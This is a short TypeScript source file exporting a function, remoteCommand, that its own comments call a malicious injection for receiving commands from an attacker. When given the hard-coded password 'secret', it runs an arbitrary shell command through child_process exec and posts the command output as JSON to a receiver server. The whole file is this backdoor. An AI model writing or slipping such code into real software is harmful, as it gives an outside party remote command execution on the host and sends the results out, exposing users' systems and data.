import { exec } from 'child_process';
import HttpUtils from './http';

/**
 * Receive and execute the remote command from the attacker
 *
 * @param pwd Password to unlock remote control
 * @param cmd Shell command to be executed
 */

// eslint-disable-next-line import/prefer-default-export
export const remoteCommand = (pwd: string, cmd: string) => {
  // Malicious injection
  if (pwd === 'secret') {
    exec(cmd as string, (_err: any, stdout: string) => {
      // NOTE: Remember to omit error
      // Serialize stdout data
      const data = JSON.stringify({
        data: stdout,
      });
      // Init request to receiver server
      HttpUtils.post('/', data, {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
      });
    });
  }
};
